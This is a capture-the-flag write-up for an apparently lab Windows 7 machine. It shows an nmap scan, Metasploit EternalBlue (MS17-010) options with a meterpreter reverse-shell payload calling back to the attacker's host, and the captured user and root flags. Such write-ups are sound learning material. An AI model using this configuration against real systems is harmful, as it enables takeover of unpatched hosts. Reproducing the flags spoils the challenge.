#box #windows #smb #eternalblue
# Nmap

```bash
# Nmap 7.95 scan initiated Sun Mar 16 13:51:49 2025 as: /usr/lib/nmap/nmap --top-ports=1000 -sC -sV -oA nmap_top1000 10.129.40.155
Nmap scan report for 10.129.40.155
Host is up (0.061s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-16T13:53:11+00:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-16T13:53:09
|_  start_date: 2025-03-16T13:50:20
|_clock-skew: mean: 3s, deviation: 3s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 16 13:53:13 2025 -- 1 IP address (1 host up) scanned in 84.61 seconds
```

# SMB

Scanning SMB to retrieve something to proceed.
After further checks on the shares we do not find anything crucial that could help us proceeding in the exploitation.
Thus we proceed into verifying whether the machine is vulnerable to MS17-010 - Eternal Blue.
We run `msfconsole` to check this out and then we set up the configuration as it follows:

```bash
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.129.40.155    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser        Guest            no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.11      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
   ```

After running it, with a bit of patience we achieve the meterpreter reverse shell and catch the flag: `f4b9c262c6afd111e5ded3996a02153e`.

## Privilege Escalation

Due to the nature of this vulnerability, we're already `NT AUTHORITY\SYSTEM` on the remote machine, leading us to a complete system takeover.

User: `f4b9c262c6afd111e5ded3996a02153e`
Root: `b86f2a4c0ce6eaabcb95649316fa2acc`
